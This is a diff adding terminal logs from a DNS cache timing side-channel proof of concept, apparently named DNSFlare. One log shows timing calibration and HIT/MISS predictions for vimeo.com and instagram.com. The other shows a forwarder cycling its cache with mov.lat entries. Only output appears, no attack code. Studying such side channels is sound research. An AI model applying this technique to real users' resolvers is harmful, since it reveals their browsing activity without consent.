@@ -1,0 +1,758 @@
+Terminal 1 -----------------------------------------------------------------------------
+
+╭─┤ phlipow├─┤  kali├─┤  ~/DNSFlare/PoC│
+╰→ sudo ./.venv/bin/python MyPoC.py --targets vimeo.com,instagram.com
+ * Serving Flask app 'MyPoC'
+ * Debug mode: off
+{19:31:37:424} [CALIBRATING] vimeo.com #1/10 | MISS: 22.10ms | HIT: 3.00ms
+{19:31:37:428} [CALIBRATING] instagram.com #1/10 | MISS: 56.60ms | HIT: 3.30ms
+{19:31:41:911} [CALIBRATING] vimeo.com #2/10 | MISS: 81.70ms | HIT: 3.70ms
+{19:31:41:914} [CALIBRATING] instagram.com #2/10 | MISS: 111.00ms | HIT: 2.90ms
+{19:31:45:930} [CALIBRATING] vimeo.com #3/10 | MISS: 25.80ms | HIT: 3.90ms
+{19:31:45:937} [CALIBRATING] instagram.com #3/10 | MISS: 30.30ms | HIT: 4.60ms
+{19:31:49:935} [CALIBRATING] vimeo.com #4/10 | MISS: 24.50ms | HIT: 3.30ms
+{19:31:49:939} [CALIBRATING] instagram.com #4/10 | MISS: 55.80ms | HIT: 3.10ms
+{19:31:53:998} [CALIBRATING] vimeo.com #5/10 | MISS: 22.50ms | HIT: 3.10ms
+{19:31:54:002} [CALIBRATING] instagram.com #5/10 | MISS: 32.40ms | HIT: 3.10ms
+{19:31:58:041} [CALIBRATING] vimeo.com #6/10 | MISS: 22.20ms | HIT: 3.20ms
+{19:31:58:045} [CALIBRATING] instagram.com #6/10 | MISS: 28.00ms | HIT: 2.90ms
+{19:32:02:010} [CALIBRATING] vimeo.com #7/10 | MISS: 22.70ms | HIT: 6.20ms
+{19:32:02:016} [CALIBRATING] instagram.com #7/10 | MISS: 25.20ms | HIT: 5.50ms
+{19:32:06:014} [CALIBRATING] vimeo.com #8/10 | MISS: 25.30ms | HIT: 3.80ms
+{19:32:06:017} [CALIBRATING] instagram.com #8/10 | MISS: 33.70ms | HIT: 3.00ms
+{19:32:09:973} [CALIBRATING] vimeo.com #9/10 | MISS: 21.30ms | HIT: 5.30ms
+{19:32:09:979} [CALIBRATING] instagram.com #9/10 | MISS: 30.30ms | HIT: 3.00ms
+{19:32:13:944} [CALIBRATING] vimeo.com #10/10 | MISS: 24.70ms | HIT: 4.90ms
+{19:32:13:944} [CALIBRATED] vimeo.com | THRESHOLD: 14.15ms | HIT MEDIAN: 3.80ms | MISS MEDIAN: 24.50ms
+{19:32:13:950} [CALIBRATING] instagram.com #10/10 | MISS: 21.40ms | HIT: 6.40ms
+{19:32:13:950} [CALIBRATED] instagram.com | THRESHOLD: 17.75ms | HIT MEDIAN: 3.10ms | MISS MEDIAN: 32.40ms
+{19:32:22:197} [ATTACK] vimeo.com | TIME: 25.40ms | PREDICTION: MISS
+{19:32:22:202} [ATTACK] instagram.com | TIME: 25.50ms | PREDICTION: MISS
+{19:32:30:856} [ATTACK] vimeo.com | TIME: 101.90ms | PREDICTION: MISS
+{19:32:30:861} [ATTACK] instagram.com | TIME: 82.90ms | PREDICTION: MISS
+{19:32:39:355} [ATTACK] vimeo.com | TIME: 55.50ms | PREDICTION: MISS
+{19:32:39:360} [ATTACK] instagram.com | TIME: 102.20ms | PREDICTION: MISS
+{19:32:47:957} [ATTACK] vimeo.com | TIME: 101.70ms | PREDICTION: MISS
+{19:32:47:962} [ATTACK] instagram.com | TIME: 123.70ms | PREDICTION: MISS
+{19:32:56:455} [ATTACK] vimeo.com | TIME: 101.40ms | PREDICTION: MISS
+{19:32:56:461} [ATTACK] instagram.com | TIME: 102.50ms | PREDICTION: MISS
+{19:33:04:955} [ATTACK] vimeo.com | TIME: 3.10ms | PREDICTION: HIT
+{19:33:04:960} [ATTACK] instagram.com | TIME: 102.30ms | PREDICTION: MISS
+{19:33:13:557} [ATTACK] vimeo.com | TIME: 3.10ms | PREDICTION: HIT
+{19:33:13:562} [ATTACK] instagram.com | TIME: 122.80ms | PREDICTION: MISS
+{19:33:22:056} [ATTACK] vimeo.com | TIME: 3.10ms | PREDICTION: HIT
+{19:33:22:061} [ATTACK] instagram.com | TIME: 102.10ms | PREDICTION: MISS
+{19:33:32:302} [ATTACK] vimeo.com | TIME: 3.20ms | PREDICTION: HIT
+{19:33:32:305} [ATTACK] instagram.com | TIME: 50.10ms | PREDICTION: MISS
+{19:33:40:506} [ATTACK] vimeo.com | TIME: 6.30ms | PREDICTION: HIT
+{19:33:40:507} [ATTACK] instagram.com | TIME: 20.90ms | PREDICTION: MISS
+{19:33:48:832} [ATTACK] vimeo.com | TIME: 3.40ms | PREDICTION: HIT
+{19:33:48:832} [ATTACK] instagram.com | TIME: 29.90ms | PREDICTION: MISS
+{19:33:57:076} [ATTACK] vimeo.com | TIME: 20.40ms | PREDICTION: MISS
+{19:33:57:077} [ATTACK] instagram.com | TIME: 28.80ms | PREDICTION: MISS
+{19:34:05:309} [ATTACK] vimeo.com | TIME: 29.00ms | PREDICTION: MISS
+{19:34:05:310} [ATTACK] instagram.com | TIME: 21.60ms | PREDICTION: MISS
+{19:34:13:544} [ATTACK] vimeo.com | TIME: 25.00ms | PREDICTION: MISS
+{19:34:13:545} [ATTACK] instagram.com | TIME: 24.70ms | PREDICTION: MISS
+{19:34:21:761} [ATTACK] instagram.com | TIME: 3.10ms | PREDICTION: HIT
+{19:34:21:761} [ATTACK] vimeo.com | TIME: 23.70ms | PREDICTION: MISS
+{19:34:30:258} [ATTACK] vimeo.com | TIME: 104.50ms | PREDICTION: MISS
+{19:34:30:262} [ATTACK] instagram.com | TIME: 3.20ms | PREDICTION: HIT
+{19:34:38:860} [ATTACK] vimeo.com | TIME: 102.00ms | PREDICTION: MISS
+{19:34:38:865} [ATTACK] instagram.com | TIME: 3.10ms | PREDICTION: HIT
+{19:34:47:359} [ATTACK] vimeo.com | TIME: 101.50ms | PREDICTION: MISS
+{19:34:47:364} [ATTACK] instagram.com | TIME: 3.10ms | PREDICTION: HIT
+{19:34:55:961} [ATTACK] vimeo.com | TIME: 101.50ms | PREDICTION: MISS
+{19:34:55:965} [ATTACK] instagram.com | TIME: 2.90ms | PREDICTION: HIT
+
+Terminal 2 -----------------------------------------------------------------------------
+
+╭─┤ phlipow├─┤  kali├─┤  ~/DNSFlare/PoC│
+╰→ sudo ./.venv/bin/python DNSFowarder.py | grep -E "\[CACHED\]|(\[HIT\]|\[MISS\]).* (vimeo\.com|instagram\.com)"
+{19:31:34:024} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:34:033} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:34:038} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:31:34:043} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:34:228} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:34:233} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:34:236} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:34:237} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:34:241} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:34:329} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:34:333} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:31:34:336} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:34:339} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:31:34:341} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:31:34:344} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:31:34:347} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:31:34:348} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:31:34:423} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:34:586} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:31:34:883} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:34:887} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:31:34:890} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:34:895} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:31:36:938} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:36:955} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:37:067} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:37:121} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:37:321} [HIT] vimeo.com. (A) found on cache
+{19:31:37:420} [HIT] instagram.com. (A) found on cache
+{19:31:37:520} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:38:028} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:38:034} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:38:041} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:38:051} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:38:059} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:31:38:062} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:38:274} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:38:279} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:38:282} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:38:291} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:31:38:300} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:31:38:306} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:31:38:309} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:31:38:538} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:31:41:191} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:41:269} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:41:387} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:41:495} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:41:705} [HIT] vimeo.com. (A) found on cache
+{19:31:41:907} [HIT] instagram.com. (A) found on cache
+{19:31:42:510} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:42:520} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:42:528} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:31:42:533} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:42:537} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:42:542} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:42:545} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:42:579} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:42:755} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:42:762} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:42:765} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:42:773} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:31:42:777} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:31:42:780} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:31:42:912} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:43:308} [CACHED] Cache queue cycled with 0 new entries for f5.s2.mov.lat..
+{19:31:45:521} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:45:542} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:45:591} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:45:617} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:45:813} [HIT] vimeo.com. (A) found on cache
+{19:31:45:924} [HIT] instagram.com. (A) found on cache
+{19:31:46:560} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:46:566} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:46:592} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:46:608} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:46:802} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:46:806} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:46:825} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:46:829} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:31:46:834} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:31:46:836} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:46:839} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:46:846} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:31:46:888} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:31:47:038} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:31:47:050} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:31:49:572} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:49:591} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:49:640} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:49:692} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:49:879} [HIT] vimeo.com. (A) found on cache
+{19:31:49:931} [HIT] instagram.com. (A) found on cache
+{19:31:50:050} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:50:522} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:50:526} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:50:530} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:50:542} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:50:549} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:50:562} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:31:50:569} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:50:788} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:31:50:794} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:50:799} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:50:803} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:31:50:807} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:31:50:808} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:31:50:817} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:51:073} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:51:350} [CACHED] Cache queue cycled with 0 new entries for f5.s2.mov.lat..
+{19:31:51:541} [CACHED] Cache queue cycled with 8 new entries for www.google.com..
+{19:31:53:648} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:53:667} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:53:711} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:53:740} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:53:946} [HIT] vimeo.com. (A) found on cache
+{19:31:53:995} [HIT] instagram.com. (A) found on cache
+{19:31:54:593} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:54:598} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:54:610} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:54:615} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:31:54:617} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:54:623} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:54:629} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:54:632} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:31:54:636} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:31:54:641} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:31:54:829} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:31:54:863} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:31:54:869} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:31:54:871} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:31:54:878} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:31:57:708} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:31:57:727} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:31:57:782} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:31:57:801} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:31:57:990} [HIT] vimeo.com. (A) found on cache
+{19:31:58:038} [HIT] instagram.com. (A) found on cache
+{19:31:58:645} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:31:58:657} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:31:58:663} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:31:58:668} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:31:58:673} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:31:58:674} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:31:58:893} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:31:58:896} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:31:58:901} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:58:903} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:31:58:906} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:31:58:909} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:31:58:912} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:31:58:914} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:31:59:100} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:31:59:452} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:31:59:701} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:01:647} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:01:667} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:01:726} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:01:748} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:01:948} [HIT] vimeo.com. (A) found on cache
+{19:32:01:998} [HIT] instagram.com. (A) found on cache
+{19:32:02:617} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:02:622} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:02:656} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:02:664} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:02:864} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:02:870} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:02:873} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:02:886} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:02:889} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:02:894} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:02:899} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:02:904} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:02:907} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:02:912} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:02:915} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:32:05:642} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:05:663} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:05:712} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:05:743} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:05:958} [HIT] vimeo.com. (A) found on cache
+{19:32:06:010} [HIT] instagram.com. (A) found on cache
+{19:32:06:152} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:06:625} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:06:628} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:06:634} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:06:637} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:06:643} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:06:647} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:06:863} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:06:869} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:06:873} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:06:877} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:06:894} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:32:06:900} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:07:011} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:07:064} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:07:655} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:09:618} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:09:636} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:09:688} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:09:713} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:09:920} [HIT] vimeo.com. (A) found on cache
+{19:32:09:970} [HIT] instagram.com. (A) found on cache
+{19:32:10:586} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:10:590} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:10:593} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:10:600} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:10:605} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:10:622} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:32:10:632} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:10:843} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:10:850} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:10:852} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:10:852} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:10:855} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:10:858} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:10:870} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:10:873} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:11:407} [CACHED] Cache queue cycled with 0 new entries for f12.s2.mov.lat..
+{19:32:13:603} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:13:624} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:13:672} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:13:691} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:13:892} [HIT] vimeo.com. (A) found on cache
+{19:32:13:938} [HIT] instagram.com. (A) found on cache
+{19:32:14:088} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:14:093} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:14:588} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:14:598} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:14:604} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:14:609} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:14:633} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:14:638} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:32:14:639} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:14:833} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:14:839} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:14:876} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:32:14:881} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:14:888} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:14:889} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:14:970} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:15:425} [CACHED] Cache queue cycled with 0 new entries for f19.s2.mov.lat..
+{19:32:22:100} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:22:121} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:22:170} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:22:193} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:22:828} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:22:833} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:22:837} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:22:842} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:22:848} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:23:076} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:23:079} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:23:082} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:23:086} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:23:088} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:23:096} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:23:101} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:32:23:102} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:23:278} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:23:297} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:30:548} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:30:647} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:30:772} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:30:852} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:31:477} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:31:484} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:31:487} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:31:574} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:31:578} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:31:581} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:31:582} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:31:586} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:31:589} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
